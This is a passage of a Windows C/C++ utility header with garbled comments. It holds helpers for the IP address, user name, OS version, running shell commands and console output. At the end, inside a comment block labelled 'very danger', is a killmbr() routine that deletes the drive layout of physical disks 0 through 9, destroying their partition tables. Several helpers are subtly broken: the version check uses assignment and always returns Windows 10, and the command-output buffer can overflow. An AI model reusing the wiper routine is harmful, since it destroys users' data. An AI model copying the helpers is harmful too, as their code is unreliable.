	return inet_ntoa(*(in_addr *)*host->h_addr_list);
}

/**************************************************
 *  @brief          ��õ�ǰ�û���
 *  @Sample usage   GetUser();
 *  @return      	��ǰ�û��� 0ʧ��
 *  @note		    ͷ�ļ�: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/2/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
char *GetUser()
{
	static CHAR GetUser_cUserNameBuffer[256];
	DWORD dwUserNameSize = 256;

	if (GetUserName(GetUser_cUserNameBuffer, &dwUserNameSize))
	{
		return GetUser_cUserNameBuffer;
	}
	else
		return 0;
}

/**************************************************
 *  @brief          ���ϵͳ�汾
 *  @Sample usage   GetSystemVersion();
 *  @return         ϵͳ�汾
 *  @note		    ͷ�ļ�: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        4.0
 *  @date           2021/2/24
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
const char *GetSystemVersion()
{
	OSVERSIONINFO osv = {0};
	osv.dwOSVersionInfoSize = sizeof(osv);
	if (!GetVersionEx(&osv))
		return 0;
	else if (osv.dwMajorVersion = 10 && osv.dwMinorVersion == 0)
		return "Windows 10"; // or windows server 2016
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 3)
		return "Windows 8.1"; // or windows server 2012 R2
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 2)
		return "Windows 8"; // or windows server 2012
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 1)
		return "Windows 7"; // or windows server 2008 R2
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 0)
		return "Windows Vista"; // or windows server 2008
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 2)
		return "Windows server 2003"; // or windows server 2003 R2
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 1)
		return "Windows xp";
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 1)
		return "Windows 2000";
	else
		return "err";
}

/**************************************************
 *  @brief          ִ��cmd�����÷���ֵ
 *  @Sample usage   getCmdResult("echo 1");
 *  @return         ����ֵ
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2022/3/5
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
char *getCmdResult(const char *Cmd)
{
	static char getCmdResult_Result[102400] = {0};
	char buf1[1024000] = {0};
	FILE *pf = popen(Cmd, "r");
	while (fgets(buf1, sizeof buf1, pf))
		snprintf(getCmdResult_Result, 1024000, "%s%s", getCmdResult_Result, buf1);
	pclose(pf);
	return getCmdResult_Result;
}

/**************************************************
 *  @brief          �������
 *  @param          str:Ҫ������ַ���,y:������ڼ���;
 *  @Sample usage   OutoutMiddle("xbebhxx3",1);
 *  @note	        ͷ�ļ�: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void OutoutMiddle(const char str[], int y)
{
	COORD pos;
	HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE); //�������ľ��

	CONSOLE_SCREEN_BUFFER_INFO bInfo;
	GetConsoleScreenBufferInfo(hOutput, &bInfo); //��ȡ����̨��Ļ��������С

	int dwSizeX = bInfo.dwSize.X, dwSizey = bInfo.dwSize.Y;
	int len = strlen(str); //��ȡҪ������ַ����ĳ���
	int x = dwSizeX / 2 - len / 2;
	pos.X = x; //������
	pos.Y = y; //������

	SetConsoleCursorPosition(hOutput, pos); //�ƶ����
	printf("%s", str);						//���
	CloseHandle(hOutput);
}

/**************************************************
 *  @brief          ȫ�����
 *  @param          hwnd:����hwnd
 *  @Sample usage   full_screen(GetForegroundWindow());
 *  @note	        ͷ�ļ�: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void full_screen(HWND hwnd)
{
	int cx = GetSystemMetrics(SM_CXSCREEN); /* ��Ļ��� ���� */
	int cy = GetSystemMetrics(SM_CYSCREEN); /* ��Ļ�߶� ���� */

	LONG l_WinStyle = GetWindowLong(hwnd, GWL_STYLE); /* ��ȡ������Ϣ */

	SetWindowLongPtr(hwnd, GWL_STYLE, GetWindowLongPtr(hwnd, GWL_STYLE) & ~(WS_CAPTION | WS_SIZEBOX)); //���ô�����Ϣ ��� ȡ�����������߿�
	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx + 18, cy, 0);
}

/*********************************************
 *  @brief           ���������
 *  @param           min:��Сֵ,max:���ֵ
 *  @return          �����
 *  @note            ͷ�ļ�: #include <random> #include <time.h>
 *  @author          xbebhxx3
 *  @version         �汾��
 *  @date            ����
 *  @copyright       Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **********************************************/
long long radom(long long min, long long max)
{
	random_device seed; //Ӳ���������������
	POINT p;
	GetCursorPos(&p);										  //��ȡ�������
	ranlux48 engine(seed() + time(0) - (p.x * p.y) + rand()); //���������������������
	uniform_int_distribution<> distrib(min, max);			  //�����������Χ����Ϊ���ȷֲ�
	return distrib(engine);									  //�����
}

/**************************************************
 *  @brief          �ƻ�mbr(very danger)
 *  @Sample usage   killmbr();
 *  @note		    ͷ�ļ�: #include<Windows.h> #include<ntddscsi.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved


void killmbr(){
	DWORD lpBytesReturned;
	OVERLAPPED lpOverlapped={0};
	HANDLE DiskHandle=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);//�ƻ�mbr
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive1",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive2",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive3",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive4",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive5",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive6",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive7",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive8",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive9",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
}
**************************************************/
#endif
